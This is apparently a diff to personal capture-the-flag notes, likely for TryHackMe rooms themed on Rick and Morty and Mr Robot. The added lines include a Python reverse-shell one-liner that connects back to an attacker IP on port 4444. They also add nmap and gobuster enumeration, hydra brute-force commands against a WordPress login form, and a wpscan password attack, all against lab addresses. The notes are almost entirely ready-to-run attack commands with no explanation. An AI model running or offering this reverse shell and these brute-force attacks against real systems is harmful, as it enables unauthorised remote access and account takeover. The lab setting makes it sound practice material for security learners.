@@ -6,4 +6,20 @@ Wubbalubbadubdub
 
 gobuster dir -u 10.10.162.228 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 
+
+Reverse Shell
 python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.6.39.83",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+Mr Robot
+#Enumeration
+1. nmap -Sc -sV 10.10.186.250
+
+#Enumeration
+1. gobuster dir -u 10.10.186.250 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+#BruteForcing
+1. hydra -L fsocity.txt -p mypassword 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
+
+2. hydra -l elliot -P fsocity.txt 10.10.186.250 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In:Invalid username"
+
+3. wpscan --url http://10.10.186.250 -t 50 -U Elliot -P fsocity.txt
